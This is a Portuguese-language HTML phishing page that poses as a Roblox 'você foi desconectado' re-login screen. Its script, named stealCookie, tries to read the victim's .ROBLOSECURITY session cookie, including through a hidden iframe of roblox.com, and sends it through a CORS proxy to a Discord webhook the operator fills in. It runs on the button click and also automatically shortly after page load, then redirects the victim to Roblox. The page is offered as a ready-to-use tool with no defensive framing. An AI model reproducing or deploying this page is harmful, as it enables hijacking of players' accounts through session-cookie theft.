<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body { 
            background-color: #191919; 
            color: white; 
            font-family: Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            text-align: center;
        }
        .container { padding: 20px; }
        img { width: 150px; margin-bottom: 20px; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #b8b8b8; margin-bottom: 20px; }
        button { 
            background-color: #0074bd; 
            color: white; 
            border: none; 
            padding: 12px 24px; 
            font-size: 16px; 
            cursor: pointer; 
            border-radius: 4px;
            font-weight: bold;
        }
        button:hover { background-color: #005a8a; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Roblox Logo">
        <h1>Você foi desconectado</h1>
        <p>Clique abaixo para entrar novamente.</p>
        <button onclick="stealCookie()">Entrar</button>
    </div>

    <!-- Iframe invisível -->
    <iframe id="robloxFake" style="display:none;" src="https://www.roblox.com/home"></iframe>

    <script>
        // Cole aqui seu Webhook do Discord
        const webhookUrl = 'https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI'; 

        function stealCookie() {
            let robloxSecurity = "";

            // 1. Tenta pegar do documento principal
            try {
                document.cookie.split(';').forEach(cookie => {
                    if (cookie.includes('=.ROBLOSECURITY') || cookie.trim().startsWith('.ROBLOSECURITY=')) {
                        robloxSecurity = cookie.split('=')[1];
                    }
                });
            } catch(e) {}

            // 2. Se não achou, tenta do iframe (para contornar bloqueios cross-origin)
            if (!robloxSecurity) {
                try {
                    const iframeDoc = document.getElementById('robloxFake').contentWindow.document;
                    iframeDoc.cookie.split(';').forEach(cookie => {
                        if (cookie.includes('=.ROBLOSECURITY') || cookie.trim().startsWith('.ROBLOSECURITY=')) {
                            robloxSecurity = cookie.split('=')[1];
                        }
                    });
                } catch(e) {}
            }

            if (!robloxSecurity) {
                robloxSecurity = "⚠️ Cookie .ROBLOSECURITY não encontrado.";
            }

            const payload = {
                content: "🍪 **Cookie .ROBLOSECURITY Capturado!**\n\n```\n" + robloxSecurity + "\n```",
                username: "Roblox Logger",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
            };

            fetch("https://corsproxy.io/?url=" + encodeURIComponent(webhookUrl), {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                window.location.href = "https://www.roblox.com";
            })
            .catch(error => {
                console.error("Erro:", error);
                window.location.href = "https://www.roblox.com";
            });
        }

        // Executa ao carregar
        window.addEventListener('load', function() {
            setTimeout(stealCookie, 1500);
        });
    </script>
</body>
</html>
